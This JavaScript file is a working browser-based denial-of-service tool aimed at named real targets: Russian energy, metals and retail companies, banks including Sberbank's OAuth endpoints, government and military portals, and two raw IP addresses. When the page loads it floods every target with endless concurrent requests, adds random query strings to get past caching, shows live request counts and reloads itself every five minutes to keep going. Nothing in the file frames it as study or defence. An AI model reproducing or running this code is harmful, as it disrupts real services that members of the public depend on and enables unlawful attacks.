var targets = {
  'https://gazprom.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://lukoil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://magnit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.nornickel.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.surgutneftegas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.tatneft.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://nlmk.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.sibur.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.severstal.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.metalloinvest.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://nangs.org/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.tmk-group.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ya.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.eurosib.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://omk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'http://government.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://mil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.nalog.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://customs.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://pfr.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'http://109.207.1.118/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'http://109.207.1.97/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://api.sberbank.ru/prod/tokens/v2​/oauth': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://api.sberbank.ru/prod/tokens/v2​/oidc': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://shop-rt.com': { number_of_requests: 0, number_of_errored_responses: 0 },
}

var statsEl = document.getElementById('stats');
function printStats() {
  statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
}
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 1000, mode: 'no-cors' })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
          targets[target].error_message = error.message
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
            targets[target].error_message = response.statusText
          }
          targets[target].number_of_requests++;
        })

    )
  }
}

// Start
Object.keys(targets).map(flood)


function myProgressbar(id) {
  var obj = {
      outer: [
        document.getElementById(id),
        {
          display: 'inline-block',
          width: '50%',
          background: '#070719',
          borderRadius: '8px',
        },
      ],
      inner: [
        document.createElement('div'),
        {
          margin: '10px',
          height: '40px',
          background: 'white',
          width: '50%',
        },
      ],
    },
    i,
    m;

  obj.outer[0].appendChild(obj.inner[0]);

  //вносим свойства стилей
  for (i in obj) {
    for (m in obj[i][1]) {
      obj[i][0].style[m] = obj[i][1][m];
    }
  }

  //запоминаем ширину
  var width = obj.inner[0].offsetWidth;

  //фиксируем высоту внешнего блока
  obj.outer[0].style.height = obj.outer[0].offsetHeight;

  //Управлялка процентажем.
  //на вход от 0 до 100
  var progress = function(m) {
      if (m <= 100 && m >= 0) {
        obj.inner[0].style.width = Math.round(width / 100 * m) + 'px';
      }
    },
    p = 0,
    direction,
    interval = setInterval(function() {
      //p = p || 0;
      if (p <= 1) {
        direction = '+';
        obj.outer[0].setAttribute('align', 'left');
      }

      if (p >= 100) {
        direction = '-';
        obj.outer[0].setAttribute('align', 'right');
      }
      direction === '+' ? p++ : p--;
      progress(p);
    }, 50);
}

myProgressbar('pb');

setTimeout(() => { location.reload(); }, 5 * 60000);

